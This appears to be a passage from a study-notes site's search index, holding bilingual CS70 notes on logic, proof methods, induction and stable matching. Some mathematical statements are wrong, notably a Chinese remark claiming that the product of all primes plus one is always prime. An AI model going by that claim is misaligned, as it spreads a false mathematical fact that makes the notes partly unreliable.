<p>\uff08\u7a77\u4e3e\u5b9a\u7406\u6211\u4eec\u5728 02-Proof \u4e2d\u7684 \"Proof by Cases\" \u90e8\u5206\u4e2d\u5c06\u4f1a\u4f7f\u7528\u5230\uff09</p>","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i3-logical-equivalence","title":"I.3 logical equivalence","text":"<p>\u5f53\u547d\u9898 \\(A\\longleftrightarrow B\\) \u662f\u91cd\u8a00\u5f0f\u65f6\uff0c\u79f0 A \u903b\u8f91\u7b49\u4ef7\u4e8e B\uff0c\u8bb0\u4f5c \\(A\\equiv B\\)\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u7b26\u53f7 \u22a8 \u4e5f\u662f\uff0c\u4f46\u662f\u6253\u4e0d\u51fa\u6765\uff0c\u6240\u4ee5\u4e00\u822c\u7528 \\(\\equiv\\) \uff1b</p> <p>\u903b\u8f91\u7b49\u4ef7\uff1a\u4efb\u4f55\u8d4b\u503c\u60c5\u51b5\u4e0b\uff0cA \u548c B \u90fd\u7b49\u503c\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i31-important-logical-equivalence","title":"I.3.1 important logical equivalence","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i4-logical-implication","title":"I.4 logical implication","text":"<p>\u5f53\u547d\u9898\u516c\u5f0f A \\(\\to\\) B \u662f\u91cd\u8a00\u5f0f\u65f6\uff0c\u5219\u79f0 A \u903b\u8f91\u8574\u6db5 B \uff0c\u8bb0\u4f5c A\u22a8B\u3002</p> <p>\u516c\u5f0f A \u7684\u6240\u6709\u6210\u771f\u8d4b\u503c\u90fd\u662f\u516c\u5f0f B \u7684\u6210\u771f\u8d4b\u503c\u3002</p> <p>\u5373\u4efb\u4f55\u8d4b\u503c\u60c5\u51b5\u4e0b\uff0c\u53ea\u8981 A \u4e3a\u771f\uff0c\u5219 B \u4e3a\u771f\uff1b \\(A \\equiv B\\) \u5373\u4e3a \\(A\u22a8B \\land B\u22a8A\\) \u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i41-important-logical-implication","title":"I.4.1 important logical implication","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i5-the-important-properties-of-logical-equivalence-and-logical-implication","title":"I.5 The important properties of logical equivalence and logical implication","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i6-ways-to-proof","title":"I.6 ways to proof","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#i7-priority-of-operations","title":"I.7 priority of operations","text":"<p>1.\u00a0\u62ec\u53f7\u00a0()\uff1a\u65e0\u8bba\u5728\u54ea\u4e2a\u9886\u57df\uff0c\u62ec\u53f7\u59cb\u7ec8\u5177\u6709\u6700\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u7528\u4e8e\u6539\u53d8\u9ed8\u8ba4\u7684\u4f18\u5148\u7ea7\u987a\u5e8f\u3002 2.\u00a0\u975e\u00a0~\u00a0\u00a0!\uff1a\u5728\u903b\u8f91\u8fd0\u7b97\u4e2d\uff0c\u5426\u5b9a\uff08\u903b\u8f91\u975e\u3001\u4f4d\u975e\uff09\u901a\u5e38\u5177\u6709\u8f83\u9ad8\u7684\u4f18\u5148\u7ea7\u3002 3.\u00a0\u4e0e\u00a0\u2227\uff1a\u8fd9\u5305\u62ec\u903b\u8f91\u4e0e\uff08AND\uff09\u3001\u4f4d\u4e0e\uff08&amp;\uff09\u3002\u5728\u6ca1\u6709\u62ec\u53f7\u6539\u53d8\u987a\u5e8f\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u901a\u5e38\u5728\u5426\u5b9a\u4e4b\u540e\u7acb\u5373\u8bc4\u4f30\u3002 4.\u00a0\u5f02\u6216\u00a0\u2295\uff1a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u8003\u8651\u5f02\u6216\u8fd0\u7b97\uff08XOR\uff09\uff0c\u5b83\u53ef\u80fd\u5728\u4e0e\u8fd0\u7b97\u548c\u6216\u8fd0\u7b97\u4e4b\u95f4\u3002 5.\u00a0\u6216\u00a0\u2228\uff1a\u8fd9\u5305\u62ec\u903b\u8f91\u6216\uff08OR\uff09\u3001\u4f4d\u6216\uff08|\uff09\u3002\u5b83\u4eec\u5728\u903b\u8f91\u4e0e\u4e4b\u540e\u8fdb\u884c\u8bc4\u4f30\u3002 6.\u00a0\u6761\u4ef6\u00a0\u2192\uff1a\u5982\u8574\u542b\uff08\u2192\uff09\u901a\u5e38\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002 7.\u00a0\u53cc\u6761\u4ef6\u2194\uff1a\u53cc\u6761\u4ef6\uff08\u2194\uff09\u901a\u5e38\u5177\u6709\u6700\u4f4e\u7684\u4f18\u5148\u7ea7</p>","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#ii-signs-in-latex","title":"II signs in latex","text":"\u7b26\u53f7 \u00ac \u2227 \u2228 \u2192 \u2194 latex \u516c\u5f0f \\neg \\wedge \\vee \\to \\leftrightarrow","tags":["DMPT","notes"]},{"location":"note/cs70/01-Propositional_Logic/#iii-practice","title":"III Practice","text":"<p>Quote</p> <p>We need a lot of insight into propositions rather than just grasping concepts</p> <p>Question</p> <p>For every real number k, there is a unique real solution to \\(x^{3}\\) = k.</p> <p>(\u2200k \u2208 R) (\u2203x \u2208 R)(x 3 = k)\u2227(\u2200y,z \u2208 R)(((y 3 = k)\u2227(z 3 = k)) \u21d2 (y = z)) .</p>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/","title":"02 Proof","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#i-four-proof-technologies","title":"I Four proof technologies","text":"<p>We will follow below (omitted for direct proof ):</p> <p>Attention</p> <p>Note that the first line of our proof stated our proof technique \u2014 this is good practice for any proof, similar to how commenting code is good practice when programming.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#i1-direct-proof","title":"I.1 Direct proof\uff08\u76f4\u63a5\u8bc1\u660e\uff09","text":"\\[\\boxed{\\begin{array}{c}\\textbf{Direct Proof}\\\\Goal\\colon\\text{To prove }P\\Longrightarrow Q.\\\\Approach\\colon\\text{Assume }P\\\\\\vdots\\\\\\text{Therefore }Q\\end{array}}\\] <p>\u76f4\u63a5\u8bc1\u660e\uff0c\u5373\u4ece\u5df2\u77e5\u6761\u4ef6 P \u76f4\u63a5\u63a8\u7406\u8bc1\u660e\u7ed3\u8bba Q\uff0c\u65e0\u9700\u591a\u8a00\u3002</p> <p>Theorem 2.1</p> <p>the sum of the digits of n is divisible by 3 \\(\\iff\\) n is divisible by 3</p> <p>\u8fd9\u4e2a\u5b9a\u7406\u6211\u4eec\u81ea\u5c0f\u5b66\u5c31\u542c\u8fc7\u4f1a\u7528\uff0c\u5982\u4f55\u8bc1\u660e\uff1f</p> proof <p>\u53d6 \\(a_1\u3001a_2\u3001\\cdots\u3001a_{n} \\in N^{+}\\)\uff0c\u90a3\u4e48 <code>the sum of the digits of n</code> \u4e5f\u5c31\u662f \\(\\sum a_{k}\\) \uff0c\u4efb\u610f\u4e00\u4e2a\u6574\u6570\u53ef\u4ee5\u8868\u793a\u4e3a </p> \\[n=\\sum_{k = 0}^{n} a_{k}*10^{k}=\\sum a_{k}+\\sum_{k=1}^{n}a_{k}*\\omega_{k}\\] <p>\u5176\u4e2d \\(\\omega_{k}\\) \u662f\u4e00\u4e2a\u5404\u4f4d\u5747\u4e3a 9 \u7684 k \u4f4d\u6570\uff0c\u663e\u7136\u53ef\u88ab 3 \u6574\u9664\uff0c\u90a3\u4e48\u7ed3\u8bba\u663e\u7136\u4e86\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#i2-proof-by-contraposition","title":"I.2 Proof by Contraposition\uff08\u5bf9\u4f4d\u8bc1\u660e\uff09","text":"<p>\u5bf9\u4f4d\u8bc1\u660e\uff0c\u65e2\u662f\u6c42\u8bc1\u5176\u9006\u5426\u547d\u9898\uff08\u5b83\u4e0e\u539f\u547d\u9898\u7684\u771f\u5047\u6027\u662f\u4e00\u81f4\u7684\uff09</p> <p>Theorem 2.2 (Pigeonhole Principle)</p> <p>Let n and k be positive integers. Place n objects into k boxes. If n &gt; k, then at least one box must contain multiple objects</p> <p>^44f2f4</p> <p>\u8fd9\u662f\u201c\u9e3d\u5de2\u539f\u7406\u201d\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u719f\u77e5\u7684\u201c\u62bd\u5c49\u539f\u7406\u201d\uff0c\u53cd\u8bc1\u6cd5\u5f53\u7136\u53ef\u4ee5\uff0c\u4f46\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u5bf9\u4f4d\u8bc1\u660e</p> proceed by contraposition <p>If all boxes contain at most one object, then the number of objects is at most the number of boxes, i.e.(== namely), n \u2264 k.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#i3-proof-by-contradiction","title":"I.3 Proof by Contradiction(\u77db\u76fe\u8bc1\u660e)","text":"<p>\u77db\u76fe\u8bc1\u660e\uff08\u5373\u53cd\u8bc1\u6cd5\uff09\u4e5f\u662f\u6bd4\u8f83\u719f\u6089\u7684\uff0c\u5373\u5047\u8bbe\u7ed3\u8bba Q \u4e0d\u6210\u7acb\uff0c\u53d1\u73b0\u6761\u4ef6 P \u662f\u201c\u4e0d\u5bf9\u7684\u201d\uff0c\u8bf4\u660e\u5047\u8bbe\u4e0d\u6210\u7acb\uff0c\u5373\u7ed3\u8bba Q \u6210\u7acb\u3002</p> <p>Theorem 2.3</p> <p>There are infinitely many prime numbers. A subsidiary result that is useful in a more complex proof is called a lemma.</p> <p>some of famous lemmas: the Pumping Lemma and the Lifting Lemma.</p> <p>understand a simple lemma before we start to :</p> <p>Lemma 2.1</p> <p>Every natural number greater than one is either prime or has a prime divisor, where <code>one</code> is standing for <code>1</code> ; \u7b80\u5355\u6765\u8bf4\u5373\u201c\u6240\u6709\u5927\u4e8e 1 \u7684\u6574\u6570\u4e0d\u662f\u7d20\u6570\u5c31\u662f\u7d20\u6570\u7684\u500d\u6570\u201d\u3002</p> proof by contradiction <p>Suppose that Theorem 2.3 is false, i.e. that there are only finitely many primes, say k of them. </p> <p>Then, we can enumerate them: p1, p2, p3, . . . , pk. Now, define number q := p1 p2 p3 . . . pk + 1, which is the product of all primes plus one. We claim that q cannot be prime. Why? Because by definition, it is larger than all the primes p1 through pk! By Lemma 2.1, we therefore conclude that q has a prime divisor, p. This will be our statement R. </p> <p>Next, because p1, p2, p3, . . . , pk are all the primes, p must be equal to one of them; thus, p divides r := p1 p2 p3 . . . pk. Hence, p | q and p | r, implying p | (q \u2212 r). But q \u2212 r = 1, implying p \u2264 1, and hence p is not prime; this is the statement \u00acR. We thus have R \u2227 \u00acR, which is a contradiction, as desired.</p> <p>\u540c\u65f6\u6211\u4eec\u4e5f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u7ed3\u8bba\uff1a\u5c0f\u4e8e\u4e00\u4e2a\u6709\u9650\u6570\u7684\u6240\u6709\u7d20\u6570\u7684\u4e58\u79ef\u52a0 1 \u540e\u4e00\u5b9a\u4e5f\u662f\u7d20\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u51fa\u65e0\u6570\u4e2a\u7d20\u6570\u6765\uff08\u5f53\u7136\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u8986\u76d6\u5230\u6bcf\u4e2a\u7d20\u6570\uff09</p> Example <p>How to prove that \\(\\sqrt{ 2 }\\) is an irrational number? </p> Proof <p></p> Exercise <p>Prove that if there are n \u2265 2 people at a party, then at least 2 of them have the same number of friends at the party. Assume that friendships are always reciprocated: that is, if Alice is friends with Bob, then Bob is also friends with Alice.</p> proof proceed by contradiction using Pigeonhole Principle <p>Suppose the contrary that everyone has a different number of friends at the party. Since the number of friends that each person can have ranges from 0 to n\u22121, we conclude that for every i \u2208 {0,1,...,n\u22121},  there is exactly one person who has exactly i friends at the party. In particular, there is one person who has n\u22121 friends (i.e., friends with everyone), is friends with a person who has 0 friends (i.e., friends with no one). This is a contradiction since friendship is mutual.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#i4-proof-by-cases","title":"I.4 Proof by Cases\uff08\u6848\u4f8b\u8bc1\u660e\uff09","text":"<p>Quote</p> <p>Specifically, the idea behind a proof by cases is as follows:</p> <p>Sometimes when we wish to prove a claim, we don\u2019t know which of a set of possible cases is true, but we know that at least one of the cases is true. What we can do then is to prove the result in both cases; then, clearly the general statement must hold</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5bf9\u4e8e\u4e00\u4e2a\uff08\u5b58\u5728\u6027\uff09\u547d\u9898\uff0c\u6211\u4eec\u80fd\u591f\u4e3e\u51fa\u591a\u79cd\u60c5\u51b5\uff08\u80fd\u5c06\u6240\u6709\u53ef\u80fd\u6027\u5305\u62ec\uff09\uff0c\u5e76\u8bc1\u660e\u81f3\u5c11\u6709\u4e00\u79cd\u662f\u6210\u7acb\u7684\uff0c\u90a3\u4e48\uff0c\u8fd9\u4e2a\u547d\u9898\u6210\u7acb\uff08\u7531\u7a77\u5c3d\u5b9a\u7406\u4e0d\u96be\u5f97\u77e5\uff09</p> <p>Theorem 2.4</p> <p>There exist irrational numbers x and y such that xy is rational</p> proof proceed by cases <p></p> <p>attention, we don't assert which x (\\(\\sqrt{ 2 }\\) or \\(\\sqrt{ 2 }^{\\sqrt{ 2 }}\\)) is right when y = \\(\\sqrt{ 2 }\\) , but one of them must satisfy the theorem.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#ii-some-lessons","title":"II Some lessons","text":"<ul> <li>Lesson 1: When writing proofs, do not assume the claim you aim to prove!</li> <li>Lesson 2 is about the number zero: In particular, never forget to consider the case where your variables take on the value 0.</li> <li>Lesson 3 says to be careful when mixing negative numbers and inequalities.</li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/02-Proof/#iii-practice","title":"III Practice","text":"<p>Q 1</p> <p>Question</p> <p></p> <p>The (a) is easy since an integer can be only \\(3k-1, 3k, 3k+1\\) while \\(3k(&gt;3)\\) can't be a prime.</p> <p>For (b):</p> <p>We can check all the primes up to 5 to see that of these, only 5 takes part in two twin prime pairs (3,5 and 5,7). What about primes &gt; 5? For any prime m &gt; 5, we can check if m+2 and m\u22122 are both prime. Note that if m &gt; 5, then m+2 &gt; 3 and m\u22122 &gt; 3 so we can apply part (a) and we can do a proof by cases based on the two forms from part (a).</p> <p>Case 1: m is of the form 3k +1. Then m+2 = 3k +3, which is divisible by 3. So m+2 is not prime.</p> <p>Case 2: m is of the form 3k \u22121. Then m\u22122 = 3k \u22123, which is divisible by 3. So m\u22122 is not prime.</p> <p>So in either case, at least one of m+2 and m\u22122 is not prime.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/03-Mathematical_Induction/","title":"03 Mathematical Induction","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/03-Mathematical_Induction/#i-introduction","title":"I Introduction","text":"<p>In short, mathematical induction just likes domino, one pushes another.</p> <p>three simple steps:</p> <ol> <li>Base Case: Prove that P(0) is true.</li> <li>Induction Hypothesis: For arbitrary k \u2265 0, assume that P(k) is true.</li> <li>Inductive Step: With the assumption of the Induction Hypothesis in hand, show that P(k + 1) is true</li> </ol> <p>Theorem 3.1</p> <p>For all \\(n\\in N, n^{3}-n\\) is divisible by 3.</p> <p>proof proceed by induction  (In fact, we can prove it by cases since \\(n^{3}-n=(n-1)n(n+1)\\) , and one of the factors on the right side of the equation must be a multiple of 3, then we get it.)</p> <p>We now consider a more advanced proof by induction, which establishes a simplified version of the famous four color theorem. But it is too difficult for us to prove. Let's change it easier:</p> <p>Theorem 3.2</p> <p>(Two Color Theorem) our \u201cmap\u201d is given by a rectangle which is divided into regions by drawing straight lines, such that each line divides the rectangle into two regions, then:using no more than two colors (say, red and blue) such that no two bordering regions have the same color(below is an example case) </p> proceed by induction <p>we set n as the number of lines</p> <ol> <li> <p>Base Case (n = 0):  Clearly P(0) holds, since if we have n = 0 lines we can color the entire map using a single color.</p> </li> <li> <p>Induction Hypothesis:  For some arbitrary n = k \u2265 0, assume P(k).</p> </li> <li> <p>Inductive Step: Whenever we add a line, that is, P(k+1), we can always prove that P(k+1) is true by swapping parts of red and blue (as shown below)</p> </li> </ol>","tags":["DMPT","notes"]},{"location":"note/cs70/03-Mathematical_Induction/#ii-strengthening-the-induction-hypothesis","title":"II Strengthening the Induction Hypothesis","text":"<p>Sometimes, our Induction Hypothesis is too \u201cweak\u201d; it does not give us enough structure to say anything meaningful, for example:</p> <p>Theorem 3.3</p> <p>For all n \u2265 1, the sum of the first n odd numbers is a perfect square.</p> <p>In fact, we can not prove it directly. The reason is that this claim did not capture the true structure of the underlying fact we were trying to prove \u2014 it was too vague. As a result, our Induction Hypothesis wasn\u2019t strong enough to prove our desired result.</p> <p>Let us try to show the following stronger claim.</p> <p>Theorem 3.3' </p> <p>For all n \u2265 1, the sum of the first n odd numbers is \\(n^{2}\\) . (It is easy to prove by induction)</p>","tags":["DMPT","notes"]},{"location":"note/cs70/03-Mathematical_Induction/#iii-strong-induction","title":"III Strong Induction","text":"<p>Sometimes we can solve the question difficultly by using P(k) solely, that's why strong induction appears.</p> <p>strong induction: we assume the stronger statement that P(0), P(1), . . . , and P(k) are all true (i.e. that \\(\\land_{i=0}^{k} P(i)\\) is true)</p> <p>Attention</p> <p>Is there a difference between the power of strong and weak induction, i.e., can strong induction prove statements which weak induction cannot?</p> <p>No! Intuitively, this can be seen by returning to our dominoanalogy.</p> <p>Then, next one:</p> <p>Theorem 3.4</p> <p>Every natural number n &gt; 1 can be written as a product of one or more primes.</p> proof proceed by induction and cases <p>Let P(n) be the proposition that n can be written as a product of primes. We will prove that P(n) is true for all n \u2265 2. </p> <ol> <li> <p>Base Case (n = 2): We start at n = 2. Clearly P(2) holds, since 2 is a prime number. </p> </li> <li> <p>Induction Hypothesis: Assume P(n) is true for all 2 \u2264 n \u2264 k.</p> </li> <li> <p>Inductive Step: Prove that n = k +1 can be written as a product of primes. We have two cases: either k +1 is a prime number, or it is not.</p> </li> </ol> <p>For the first case, if k +1 is a prime number, then we are done since k +1 is trivially the product of one prime (itself). </p> <p>For the second case, if k + 1 is not a prime number, then by definition k + 1 = xy for some x,y \u2208 Z + satisfying 1 &lt; x, y &lt; k + 1. By the Induction Hypothesis, x and y can each be written as a product of primes (since x, y \u2264 k). But this implies that k +1 can also be written as a product of primes. Then, we get it.</p> <p>(Recursion, programming and induction are also mentioned here, but these will be covered in <code>FDS</code>, so we'll skip them)</p>","tags":["DMPT","notes"]},{"location":"note/cs70/03-Mathematical_Induction/#iv-false-proofs","title":"IV False proofs","text":"<p>Let's look at one of history's most famous false proofs which makes us laugh:</p> <p>False theorem</p> <p>All horses are the same color</p> proof proceed by induction <ol> <li> <p>Base Case (n = 1): P(1) is certainly true, since if you have a set containing just one horse, all horses in the set have the same color.</p> </li> <li> <p>Induction Hypothesis: Assume P(n) holds for some arbitrary n \u2265 1. </p> </li> <li> <p>Inductive Step: Given a set of n + 1 horses {h1,h2,...,hn+1}, we can exclude the last horse in the set and apply the induction hypothesis just to the first n horses {h1,...,hn}, deducing that they all have the same color. Similarly, we can conclude that the last n horses {h2,...,hn+1} all have the same color. But now the \u201cmiddle\u201d horses {h2,...,hn} (i.e., all but the first and the last) belong to both of these sets, so they have the same color as horse h1 and horse hn+1. It follows, therefore, that all n+1 horses have the same color. We conclude, by the principle of induction, that all horses have the same color.</p> </li> </ol>","tags":["DMPT","notes"]},{"location":"note/cs70/03-Mathematical_Induction/#v-practice","title":"V Practice","text":"<p>Q 1 Airports</p> <p></p> <p>\u7b80\u800c\u8a00\u4e4b\uff0c\u5947\u6570\u4e2a\u673a\u573a\u4e24\u4e24\u76f8\u8ddd\u4e0d\u540c\uff0c\u4e00\u5b9a\u6709\u4e00\u4e2a\u673a\u573a A \u5230\u4efb\u610f\u673a\u573a B \u7684\u8ddd\u79bb\u6bd4\u5269\u4f59\u673a\u573a\u5176\u4e00 C \u5230 B \u7684\u8ddd\u79bb\u8981\u8fdc\uff0c\u56e0\u800c\u6ca1\u6709\u98de\u673a\u964d\u843d\u5728 A\u3002</p> <p>\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\uff1a</p> <ol> <li> <p>\\(n=1\\) \u65f6\uff0c\u5373\u4e09\u4e2a\u673a\u573a\uff0c\u4e0d\u59a8\u8bbe a,b,c \u4e14 ab \u4e4b\u95f4\u7684\u8ddd\u79bb\u6700\u8fd1\uff0c\u5219\u6ca1\u6709\u98de\u673a\u53bbc</p> </li> <li> <p>\\(n=k\\) \u65f6\uff0c\u5047\u8bbe\u6210\u7acb</p> </li> <li> <p>\u5f53 \\(n=k+1\\) \u65f6\u6211\u4eec\u5148\u53bb\u6389\u76f8\u8ddd\u6700\u8fd1\u7684\u4e24\u4e2a\u673a\u573a(a,b)\uff0c\u53c8\u56de\u5230\u4e86 \\(n=k\\) \u7684\u60c5\u51b5\uff0c\u4e0d\u59a8\u8bbe\u6ca1\u6709\u98de\u673a\u53bb\u7684\u662f z\uff0c\u73b0\u5728\u6211\u4eec\u628a a,b \u52a0\u56de\u6765\uff0c\u4ed6\u4fe9\u7684\u98de\u673a\u4e0d\u53ef\u80fd\u53bb z\uff0c\u90a3\u4e48 \\(n = k+1\\) \u547d\u9898\u4f9d\u65e7\u6210\u7acb\uff0c\u547d\u9898\u5f97\u8bc1\u3002</p> </li> </ol> <p>Q 2 Coins game</p> <p>Question</p> <p></p> <p>\u7b80\u800c\u8a00\u4e4b\uff0c\u4e00\u5806\u786c\u5e01\u6bcf\u6b21\u5206\u6210\u4e24\u5806\uff0c\u4e2a\u6570\u76f8\u4e58\u4e3a\u5c0f\u5f97\u5206\uff1b\u7ee7\u7eed\u5206\u76f4\u5230\u6240\u6709\u5806\u90fd\u53ea\u6709\u4e00\u4e2a\u786c\u5e01\uff0c\u6240\u5f97\u603b\u5206\u4e3a\u5c0f\u5f97\u5206\u76f8\u52a0\uff0c\u4f46\u662f\u603b\u5f97\u5206\u7ec8\u4f1a\u662f \\(\\frac{n(n-1)}{2}\\) </p> <p>\u4e0d\u96be\u53d1\u73b0\u5176\u5b9e\u8fd9\u4e0e\u6211\u4eec\u8bc1\u660e Theorem 4 \u662f\u7c7b\u4f3c\u7684\uff0c\u5c06\u672a\u8bc1\u660e\u60c5\u51b5\u8f6c\u53d8\u4e3a\u5df2\u8bc1\u660e\u60c5\u51b5\uff0c\u4e0b\u9762\u662f\u53c2\u8003\u89e3\u7b54\uff1a</p> <p></p> <p>Q 3 Grid Induction</p> <p>Question</p> <p>Pacman is walking on an infinite 2 D grid. He starts at some location (i, j) \u2208 N 2 in the first quadrant,and is constrained to stay in the first quadrant (say, by walls along the x and y axes).Every second he does one of the following (if possible):</p> <p>(i) Walk one step down, to (i, j \u2212 1). (ii) Walk one step left, to (i \u2212 1, j).</p> <p>Prove by induction that no matter how he walks, he will always reach (0, 0) in finite time.</p> <p>\u8fd9\u9053\u9898\u5f88\u7b80\u5355\uff0c\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u52a0\u5f3a\u547d\u9898\uff1aP \u7531 \\((i, j)\\) \u4e00\u5b9a\u7ecf\u8fc7 i+j \u6b65\u540e\u5230\u8fbe \\((0,0)\\) \uff08\u8bc1\u660e\u7565\uff09</p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/","title":"04 The Stable Matching Problem","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#i-introduction","title":"I Introduction","text":"<p>The Stable Matching Problem is described below</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#ii-the-propose-and-reject-algorithm","title":"II The Propose-and-Reject Algorithm","text":"<p>(a.k.a. the Gale-Shapley algorithm)</p> <p>We think of the algorithm as proceeding in \u201cdays\u201d to have a clear unambiguous sense of discrete time.</p> <p>process</p> <p>Every Morning: Each job proposes (i.e. makes an offer) to the most preferred candidate on its list who has not yet rejected this job. </p> <p>Every Afternoon: Each candidate collects all the offers she received in the morning; to the job offer she likes best among these, she responds \u201cmaybe\u201d (she now has it in hand or on a string), and to the other offers she says \u201cno\u201d (i.e., she rejects them). (This is just a way for us to virtually model that there are no \u201cexploding offers\u201d and a job can\u2019t withdraw an offer once an offer is made.) </p> <p>Every Evening: Each rejected job crosses off the candidate who rejected its offer from its list. </p> <p>The above loop is repeated each successive day until there are no offers rejected. At that point, each candidate has a job offer in hand (i.e. on a string); and on this day, each candidate accepts their offered job (i.e. the job offer she has in hand) and the algorithm terminates.</p> <p>Let\u2019s understand the algorithm by running it on our example above.</p> <p>(bold type indicates the offer accepted by the candidate)</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#iii-properties-of-the-propose-and-reject-algorithm","title":"III Properties of the Propose-and-Reject Algorithm","text":"<p>There are two properties we wish to show about the propose-and-reject algorithm:</p> <ul> <li>First, that it doesn\u2019t run forever, i.e., it halts; (it is easy to prove)</li> <li>and second, that it outputs a \u201cgood\u201d (i.e., stable) matching.</li> </ul> <p>We are going to talk about how good it is.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#iii1-stability","title":"III.1 Stability","text":"<p>A matching is unstable  if there is a job and a candidate who both prefer working with each other over their current matching . We will call  such a pair a rogue couple. So a matching of n jobs and n candidates is stable if it has no rogue couples.</p> <p>Why?</p> <p>Because in such a situation, the rogue candidate could just renege on their official offer and the rogue job/employer could just fire the person that they officially hired to hire their preferred rogue candidate instead. Then one job is suddenly empty and one innocent person just got fired. This is not what we want to see happening. We want everyone to be happy enough that they all want to follow through on their final accepted offers.</p> <p>Consider the following matching for the example above:</p> <p>{(Approximation Inc., Christine), (Basis Co., Bridget), (Control Corp., Anita)}</p> <p>Why is this matching unstable?</p> <p>(Hint: Approximation Inc. and Bridget are a rogue couple)</p> <p>Here is a stable matching for our example:</p> <p>{(Basis Co., Anita), (Approximation Inc., Bridget), (Control Corp., Christine)}.</p> <p>Why is (Approximation Inc., Anita) not a rogue couple here?</p> <p>You just need to verify according to the concepts above.</p> <p>In fact, not all matches can have a stable match result, the following is a counterexample:</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#iii2-terminatability","title":"III.2 Terminatability","text":"<p>We can't acknowledge that a algorithm is wonderful if it can't terminate. Now we will prove that the stable matching algorithm will always terminate in at most \\((n-1)^{2}+1\\) times.</p> <p>Recall that there is always a candidate who receives only one proposal (on the last day). Other than that candidate, every other candidate can reject up to n \u2212 1 jobs. Thus, there\u2019s a total of \\((n-1)^{2}\\) rejections. Conceptually, in the worst case scenario, there would be exactly one rejection per day; if we were to hand out none, then the algorithm would terminate. On the final day, the candidate who is proposed to only once receives their offer. Thus, the process takes at most \\((n-1)^{2}+1\\) days.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#iii3-analysis","title":"III.3 Analysis","text":"<p>We do know about what is a stable match.</p> <p>We now prove that the propose-and-reject algorithm always outputs a stable matching.</p> <p>Observation: Each job begins the algorithm with its first choice being a possibility; as the algorithm proceeds, however, its best available option can only get worse over time. In contrast, ^^each candidate\u2019s offers can only get better with time.^^  At some point, the jobs and the candidates must \u201cmeet\u201d in the middle, and intuitively such a matching should be stable.</p> <p>Lemma 4.1</p> <p>(Improvement Lemma) If job J makes an offer to candidate C on the kth day, then on every subsequent day C has a job offer in hand (on a string) which she likes at least as much as J.</p> <p>We can prove it by induction.</p> <p>Theorem 4.1 </p> <p>(The Well-Ordering Principle) If S \u2286 N and \\(S\\ne \\emptyset\\), then S has a smallest element.</p> <p>That is,  a non-empty set of integers must have a minimum value, which is obvious.</p> <p>Lemma 4.2</p> <p>The propose-and-reject algorithm always terminates with a matching.</p> <p>We can prove it by contradiction.</p> <p>Then comes what we are looking for:</p> <p>Theorem 4.2</p> <p>The matching produced by the algorithm is always stable.</p> Proof <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#iii4-optimality","title":"III.4 Optimality","text":"<p>To offer the best service (and to displace the current approach), you would ideally strive for ^^some notion of optimality^^ in the solutions you obtain.</p> <p></p> (Optimal candidate for a job) <p>For a given job J, the optimal candidate for J is the highest rank candidate on J\u2019s preference list that J could be paired with in any stable matching.</p> (Optimal job for a candidate) <p>For a given candidate C, the optimal job for C is the highestranked job on C\u2019s preference list that C could be paired with in any stable matching.</p> <p>The matching output by the Propose-and-Reject algorithm is job/employer optimal.</p> <p>The proof process is omitted, which you can see here</p>","tags":["DMPT","notes"]},{"location":"note/cs70/04-The_Stable_Matching_Problem/#iv-practice","title":"IV Practice","text":"<p>Q 1 Universal Preference</p> <p>\u5f53\u5927\u5bb6\u7684\u201c\u5fd7\u613f\u9009\u62e9\u201d\u4e00\u6a21\u4e00\u6837\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f</p> <p>\u4e0b\u9762\u7ed9\u51fa\u4e86\u56de\u7b54\uff1b\u6211\u4eec\u66f4\u591a\u5730\u628a\u8fd9\u9053\u9898\u7528\u4e8e\u52a0\u6df1\u5bf9 stable match algorithm \u7684\u7406\u89e3\u3002</p> <p>Question</p> <p></p> <p>Q 2 Pairing Up</p> <p>Question</p> <p>Prove that for every even n \u2265 2, there exists an instance of the stable matching problem with n jobs 